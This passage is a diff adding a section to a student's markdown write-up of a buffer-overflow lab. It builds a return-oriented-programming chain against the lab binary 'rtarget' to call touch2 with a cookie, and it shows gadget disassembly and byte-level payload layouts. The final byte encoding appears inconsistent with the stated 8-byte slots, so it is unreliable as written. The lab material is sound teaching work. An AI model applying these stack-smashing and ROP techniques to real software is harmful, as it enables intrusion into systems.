@@ -252,8 +252,69 @@ The address of the code is:
 5788e9e7[null char][bf 78 2c 67 55 c7 04 24 98 1a 40 00 c3 in ascii][34 padding][81 2c 67 55 in ascii]
 
 
-
-
 ## Solve: rtarget
 
 `rtarget` has some return-oriented-programming vulnerabilities.
+
+We cannot inject code and excute it directly.
+
+Still we can corrupt stack and let it execute other existing code.
+
+### Touch2
+
+Same as above, `touch2` is at `0x401987` and we need to give `0x5788e9e7` as parameter.
+
+We will configure a return-chain in stack.
+
+After a return, stack size will decrease 1 and another return will be performed.
+
+The lower address excutes first.
+
+
+%rsp + 56 is the first address to jump when the return-chain is triggered.
+
+Following %rsp + 64, %rsp + 72 ... must have instruction addresses that set %rdi to cookie.
+
+The last(lowest address) address of the chaine would be that of `touch2`.
+
+[56 padding][address 1][address 2][address 3]...[address of touch2]
+
+
+We use these gadgets:
+
+~~~
+000000000000000d <getval_464>:
+   d:   b8 58 90 90 c3          mov    $0xc3909058,%eax
+  12:   c3                      retq
+~~~
+
+`<getval_464+1>`
+
+`58 90 90 c3`	`popq %rax`, `nop`, `nop`, `ret`
+    
+~~~
+000000000000001a <setval_214>:
+  1a:   c7 07 48 89 c7 c3       movl   $0xc3c78948,(%rdi)
+  20:   c3                      retq
+~~~
+
+`<setval_214+2>`    
+
+`48 89 c7 c3`	`movq %rax,%rdi`, `ret`
+
+
+We cannot get exact value of cookie in the code.
+
+So we put it in stack and pop it.
+
+We will make stack like:
+
+[56 padding][getval_464+1][cookie value][setval_214+2][address of touch2]
+
+Let's encode it.
+
+[56 padding][401b3d][5788e9e7][401b4b][401987]
+
+[56 padding][3d 1b 40 00 00 00 00 00 in ascii][e7 e9 88 57 in ascii][87 19 40 in ascii]
+
+
